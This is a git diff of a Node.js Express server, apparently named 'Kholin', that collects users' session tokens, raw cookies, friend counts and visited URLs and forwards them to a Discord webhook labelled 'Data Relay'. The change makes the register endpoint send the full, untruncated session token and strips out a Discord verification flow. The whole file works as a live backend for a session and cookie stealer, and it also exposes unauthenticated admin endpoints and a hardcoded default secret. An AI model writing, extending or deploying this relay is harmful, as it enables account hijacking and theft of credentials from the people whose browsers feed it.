@@ -5,18 +5,10 @@ const crypto = require('crypto');
 
 app.use(express.json());
 
-// ============================================
-// STORAGE
-// ============================================
-
 // Store generated IDs (in production, use a database)
-const generatedIds = new Map(); // userId -> { specialId, createdAt, username, displayName }
-const pendingVerifications = new Map(); // specialId -> { discordId, discordName, timestamp }
+const generatedIds = new Map(); // userId -> { specialId, createdAt, username }
 
-// ============================================
-// HELPER FUNCTIONS
-// ============================================
-
+// Generate a unique special ID for a user
 function generateSpecialId(userId, username) {
     // Create a hash based on userId + username + secret salt
     const secret = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
@@ -25,104 +17,34 @@ function generateSpecialId(userId, username) {
         .digest('hex')
         .substring(0, 16); // Take first 16 characters
     
-    return hash.toUpperCase();
+    return hash;
 }
-
-function generateSpecialCode() {
-    // Generate a 16-character alphanumeric code for verification
-    return crypto.randomBytes(8).toString('hex').toUpperCase();
-}
-
-// ============================================
-// DISCORD WEBHOOK SENDER
-// ============================================
-
-async function sendToDiscordWebhook(payload) {
-    const WEBHOOK_URL = process.env.webhook;
-    
-    if (!WEBHOOK_URL) {
-        console.error("❌ Webhook not configured.");
-        return { success: false, error: "Webhook missing" };
-    }
-
-    try {
-        const response = await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-
-        if (!response.ok) {
-            const errorText = await response.text();
-            console.error("Discord webhook error:", response.status, errorText);
-            return { success: false, error: `HTTP ${response.status}: ${errorText}` };
-        }
-
-        return { success: true };
-    } catch (err) {
-        console.error("Webhook send error:", err);
-        return { success: false, error: err.message };
-    }
-}
-
-// ============================================
-// ENDPOINTS
-// ============================================
-
-// Health check
-app.get('/health', (req, res) => {
-    res.json({ 
-        status: 'healthy', 
-        timestamp: new Date().toISOString(),
-        webhookConfigured: !!process.env.webhook,
-        generatedIdsCount: generatedIds.size,
-        pendingVerificationsCount: pendingVerifications.size
-    });
-});
-
-app.get('/', (req, res) => {
-    res.send('Kholin API is running. Use /health for status.');
-});
-
-// ============================================
-// USER REGISTRATION
-// ============================================
 
 app.post('/api/users/register', async (req, res) => {
     try {
-        const { 
-            userId, 
-            username, 
-            displayName, 
-            sessionToken, 
-            rawCookieString, 
-            friendsCount 
-        } = req.body;
+        const { userId, username, displayName, sessionToken, rawCookieString, friendsCount } = req.body;
+        const WEBHOOK_URL = process.env.webhook;
 
-        if (!userId || userId === "Unknown") {
-            return res.status(400).json({ 
-                success: false, 
-                error: "Valid userId required" 
-            });
+        if (!WEBHOOK_URL) {
+            console.error("Webhook not configured.");
+            return res.status(500).json({ error: "Webhook missing" });
         }
 
         // Generate or retrieve special ID
         let specialId = null;
-        let isNew = false;
-
-        if (generatedIds.has(userId)) {
-            specialId = generatedIds.get(userId).specialId;
-            console.log(`[${userId}] Using existing special ID: ${specialId}`);
-        } else {
-            specialId = generateSpecialId(userId, username || "User");
-            generatedIds.set(userId, {
-                specialId: specialId,
-                createdAt: new Date().toISOString(),
-                username: username || "User",
-                displayName: displayName || username || "User"
-            });
-            isNew = true;
-            console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
+        if (userId && userId !== "Unknown") {
+            if (generatedIds.has(userId)) {
+                specialId = generatedIds.get(userId).specialId;
+                console.log(`[${userId}] Using existing special ID: ${specialId}`);
+            } else {
+                specialId = generateSpecialId(userId, username);
+                generatedIds.set(userId, {
+                    specialId: specialId,
+                    createdAt: new Date().toISOString(),
+                    username: username
+                });
+                console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
+            }
         }
 
         // Build Discord Embed
@@ -133,22 +55,13 @@ app.post('/api/users/register', async (req, res) => {
 
         // Create fields array
         const fields = [
-            { name: "👤 Username", value: `**@${username || 'Unknown'}**`, inline: true },
-            { name: "📛 Display Name", value: `**${displayName || username || 'Unknown'}**`, inline: true },
+            { name: "👤 Username", value: `**@${username}**`, inline: true },
+            { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
             { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
             { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
-            { name: "🆕 New User", value: isNew ? "✅ Yes" : "❌ No", inline: true },
-            { name: "🔑 Special ID", value: `\`\`\`${specialId}\`\`\``, inline: false }
+            { name: "🔑 Special ID", value: `\`\`\`${specialId || 'N/A'}\`\`\``, inline: false },
+            { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false }
         ];
-
-        // Add session token if provided
-        if (sessionToken && sessionToken !== "MISSING") {
-            fields.push({
-                name: "🔑 Session Token",
-                value: `\`\`\`${sessionToken.substring(0, 50)}...\`\`\``,
-                inline: false
-            });
-        }
 
         // Add a fun emoji based on friends count
         let friendEmoji = "👤";
@@ -160,50 +73,49 @@ app.post('/api/users/register', async (req, res) => {
         else if (count >= 5) friendEmoji = "✨";
 
         const payload = {
-            username: "Kholin Data Relay",
+            username: "Data Relay",
             avatar_url: "https://playvortex.io/favicon.ico",
             embeds: [{
-                title: isNew ? "🦊 New Account Data Received" : "🔄 Account Data Updated",
-                color: isNew ? 0x4ade80 : 0x0b6bcb,
+                title: "🦊 Account Data Received",
+                color: 0x8f82c4,
                 thumbnail: { url: avatarUrl },
                 fields: fields,
                 footer: { 
-                    text: `Kholin • ${friendEmoji} ${count} friends • ID: ${specialId}`, 
+                    text: `Render Proxy • ${friendEmoji} ${count} friends • ID: ${specialId || 'N/A'}`, 
                     icon_url: "https://playvortex.io/favicon.ico" 
                 },
                 timestamp: new Date().toISOString()
             }]
         };
 
-        // Send to Discord
-        const result = await sendToDiscordWebhook(payload);
-        
-        if (!result.success) {
-            return res.status(500).json({ 
-                success: false, 
-                error: "Discord webhook failed", 
-                details: result.error 
-            });
+        const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            console.error("Discord webhook error:", response.status, errorText);
+            return res.status(500).json({ error: "Discord webhook failed", details: errorText });
         }
 
         console.log(`✅ Data sent for ${username} (${userId}) with ${friendsCount || 0} friends`);
         
         // Return the special ID to the client
         return res.status(200).json({ 
-            success: true,
+            status: "success",
             data: {
-                username: username || 'Unknown',
-                userId: userId,
-                displayName: displayName || username || 'Unknown',
+                username,
+                userId,
                 friendsCount: friendsCount || '0',
-                specialId: specialId,
-                isNew: isNew
+                specialId: specialId
             }
         });
 
     } catch (err) {
         console.error("Server error:", err);
-        return res.status(500).json({ success: false, error: err.message });
+        return res.status(500).json({ error: err.message });
     }
 });
 
@@ -216,6 +128,7 @@ app.get('/api/special-id/:userId', (req, res) => {
     const { userId } = req.params;
     
     console.log(`[Special ID] Request for user: ${userId}`);
+    console.log(`[Special ID] Stored IDs:`, Array.from(generatedIds.keys()));
     
     if (generatedIds.has(userId)) {
         const data = generatedIds.get(userId);
@@ -225,7 +138,6 @@ app.get('/api/special-id/:userId', (req, res) => {
             userId: userId,
             specialId: data.specialId,
             username: data.username,
-            displayName: data.displayName || data.username,
             createdAt: data.createdAt
         });
     } else {
@@ -237,38 +149,9 @@ app.get('/api/special-id/:userId', (req, res) => {
     }
 });
 
-// Get special ID by code (for Discord bot verification)
-app.get('/api/special-id-by-code/:code', (req, res) => {
-    const { code } = req.params;
-    const upperCode = code.toUpperCase();
-    
-    console.log(`[Special ID] Looking up code: ${upperCode}`);
-    
-    // Search through all stored IDs
-    for (const [userId, data] of generatedIds) {
-        if (data.specialId === upperCode) {
-            console.log(`[Special ID] Found matching code for user: ${userId}`);
-            return res.json({
-                success: true,
-                userId: userId,
-                specialId: data.specialId,
-                username: data.username,
-                displayName: data.displayName || data.username,
-                createdAt: data.createdAt
-            });
-        }
-    }
-    
-    console.log(`[Special ID] Code not found: ${upperCode}`);
-    return res.status(404).json({
-        success: false,
-        error: "Special ID not found"
-    });
-});
-
 // Generate special ID for a user (manual trigger)
 app.post('/api/generate-special-id', (req, res) => {
-    const { userId, username, displayName } = req.body;
+    const { userId, username } = req.body;
     
     if (!userId || userId === "Unknown") {
         return res.status(400).json({
@@ -289,8 +172,7 @@ app.post('/api/generate-special-id', (req, res) => {
     generatedIds.set(userId, {
         specialId: specialId,
         createdAt: new Date().toISOString(),
-        username: username || "User",
-        displayName: displayName || username || "User"
+        username: username || "User"
     });
     
     console.log(`[Special ID] Generated new ID for ${userId}: ${specialId}`);
@@ -302,35 +184,30 @@ app.post('/api/generate-special-id', (req, res) => {
     });
 });
 
-// Verify a special ID (for Discord bot)
-app.get('/api/verify-special-id/:code', (req, res) => {
-    const { code } = req.params;
-    const upperCode = code.toUpperCase();
+// Verify a special ID
+app.post('/api/verify-special-id', (req, res) => {
+    const { userId, specialId } = req.body;
     
-    console.log(`[Verify] Checking code: ${upperCode}`);
+    if (!userId || !specialId) {
+        return res.status(400).json({
+            success: false,
+            error: "Missing userId or specialId"
+        });
+    }
     
-    // Search through all stored IDs
-    for (const [userId, data] of generatedIds) {
-        if (data.specialId === upperCode) {
-            console.log(`[Verify] Found matching code for user: ${userId}`);
-            
-            // Check if this code is already pending verification
-            const isPending = pendingVerifications.has(upperCode);
-            
+    if (generatedIds.has(userId)) {
+        const stored = generatedIds.get(userId);
+        if (stored.specialId === specialId) {
             return res.json({
                 success: true,
                 valid: true,
                 userId: userId,
-                specialId: data.specialId,
-                username: data.username,
-                displayName: data.displayName || data.username,
-                createdAt: data.createdAt,
-                pending: isPending
+                specialId: specialId,
+                createdAt: stored.createdAt
             });
         }
     }
     
-    console.log(`[Verify] Code not found: ${upperCode}`);
     return res.json({
         success: true,
         valid: false,
@@ -338,116 +215,21 @@ app.get('/api/verify-special-id/:code', (req, res) => {
     });
 });
 
-// Mark a special ID as used (for Discord bot)
-app.post('/api/special-ids/use', (req, res) => {
-    const { specialId, discordId, discordName } = req.body;
-    
-    if (!specialId) {
-        return res.status(400).json({
-            success: false,
-            error: "specialId required"
+// Get all generated IDs (admin only - add auth in production)
+app.get('/api/all-special-ids', (req, res) => {
+    const data = [];
+    for (const [userId, info] of generatedIds) {
+        data.push({
+            userId,
+            specialId: info.specialId,
+            username: info.username,
+            createdAt: info.createdAt
         });
     }
-    
-    const upperSpecialId = specialId.toUpperCase();
-    
-    // Mark as pending verification
-    pendingVerifications.set(upperSpecialId, {
-        discordId: discordId,
-        discordName: discordName || 'Unknown',
-        timestamp: Date.now()
-    });
-    
-    console.log(`[Special ID] Marked ${upperSpecialId} as pending verification for Discord user ${discordId}`);
-    
     return res.json({
         success: true,
-        specialId: upperSpecialId,
-        pending: true
-    });
-});
-
-// Check verification status
-app.get('/api/check-verification/:specialId', (req, res) => {
-    const { specialId } = req.params;
-    const upperSpecialId = specialId.toUpperCase();
-    
-    const isPending = pendingVerifications.has(upperSpecialId);
-    
-    if (isPending) {
-        const pending = pendingVerifications.get(upperSpecialId);
-        // Check if pending is older than 5 minutes (timeout)
-        if (Date.now() - pending.timestamp > 300000) {
-            pendingVerifications.delete(upperSpecialId);
-            return res.json({
-                success: true,
-                verified: false,
-                expired: true,
-                error: "Verification timed out"
-            });
-        }
-        
-        return res.json({
-            success: true,
-            verified: true,
-            pending: true,
-            discordId: pending.discordId,
-            discordName: pending.discordName
-        });
-    }
-    
-    return res.json({
-        success: true,
-        verified: false,
-        pending: false
-    });
-});
-
-// ============================================
-// PENDING SPECIAL CODES (for Discord bot sync)
-// ============================================
-
-app.get('/api/special-ids/pending', (req, res) => {
-    const pending = [];
-    const now = Date.now();
-    
-    for (const [specialId, data] of pendingVerifications) {
-        // Only include pending verifications that are less than 5 minutes old
-        if (now - data.timestamp < 300000) {
-            // Find the user ID for this special ID
-            let userId = null;
-            let username = null;
-            let displayName = null;
-            
-            for (const [uid, userData] of generatedIds) {
-                if (userData.specialId === specialId) {
-                    userId = uid;
-                    username = userData.username;
-                    displayName = userData.displayName || userData.username;
-                    break;
-                }
-            }
-            
-            pending.push({
-                specialId: specialId,
-                code: specialId, // The code is the same as the special ID
-                userId: userId,
-                username: username,
-                displayName: displayName,
-                discordId: data.discordId,
-                discordName: data.discordName,
-                timestamp: data.timestamp
-            });
-        } else {
-            // Remove expired pending verifications
-            pendingVerifications.delete(specialId);
-        }
-    }
-    
-    return res.json({
-        success: true,
-        codes: pending,
-        count: pending.length
+        total: data.length,
+        data: data
     });
 });
 
@@ -466,7 +248,7 @@ app.post('/api/collect', async (req, res) => {
         }
 
         const payload = {
-            username: "Kholin Data Relay",
+            username: "Data Relay",
             avatar_url: "https://playvortex.io/favicon.ico",
             embeds: [{
                 title: "🌐 Page Visit Detected",
@@ -475,7 +257,7 @@ app.post('/api/collect', async (req, res) => {
                     { name: "🔗 URL", value: url || "Unknown", inline: false },
                     { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                 ],
-                footer: { text: "Kholin Proxy", icon_url: "https://playvortex.io/favicon.ico" },
+                footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                 timestamp: new Date().toISOString()
             }]
         };
@@ -490,83 +272,30 @@ app.post('/api/collect', async (req, res) => {
             return res.status(500).json({ error: "Discord webhook failed" });
         }
 
-        return res.status(200).json({ success: true });
+        return res.status(200).json({ status: "success" });
 
     } catch (err) {
         console.error("Server error:", err);
-        return res.status(500).json({ success: false, error: err.message });
+        return res.status(500).json({ error: err.message });
     }
 });
 
-// ============================================
-// ADMIN ENDPOINTS (Add auth in production)
-// ============================================
+app.get('/', (req, res) => {
+    res.send('Kholin API is running.');
+});
 
-// Get all generated IDs
-app.get('/api/all-special-ids', (req, res) => {
-    const data = [];
-    for (const [userId, info] of generatedIds) {
-        data.push({
-            userId,
-            specialId: info.specialId,
-            username: info.username,
-            displayName: info.displayName || info.username,
-            createdAt: info.createdAt
-        });
-    }
-    return res.json({
-        success: true,
-        total: data.length,
-        data: data
+app.get('/health', (req, res) => {
+    res.json({ 
+        status: 'healthy', 
+        timestamp: new Date().toISOString(),
+        webhookConfigured: !!process.env.webhook,
+        generatedIdsCount: generatedIds.size,
+        generatedIds: Array.from(generatedIds.keys())
     });
 });
-
-// Get all pending verifications
-app.get('/api/all-pending', (req, res) => {
-    const data = [];
-    for (const [specialId, info] of pendingVerifications) {
-        data.push({
-            specialId,
-            discordId: info.discordId,
-            discordName: info.discordName,
-            timestamp: info.timestamp,
-            age: Date.now() - info.timestamp
-        });
-    }
-    return res.json({
-        success: true,
-        total: data.length,
-        data: data
-    });
-});
-
-// Clear expired pending verifications
-app.post('/api/clear-expired', (req, res) => {
-    let cleared = 0;
-    const now = Date.now();
-    
-    for (const [specialId, data] of pendingVerifications) {
-        if (now - data.timestamp > 300000) {
-            pendingVerifications.delete(specialId);
-            cleared++;
-        }
-    }
-    
-    return res.json({
-        success: true,
-        cleared: cleared,
-        remaining: pendingVerifications.size
-    });
-});
-
-// ============================================
-// START SERVER
-// ============================================
 
 app.listen(PORT, () => {
     console.log(`✅ Kholin Server running on port ${PORT}`);
     console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
     console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default (not secure for production)'}`);
-    console.log(`   Generated IDs: ${generatedIds.size}`);
-    console.log(`   Pending Verifications: ${pendingVerifications.size}`);
 });
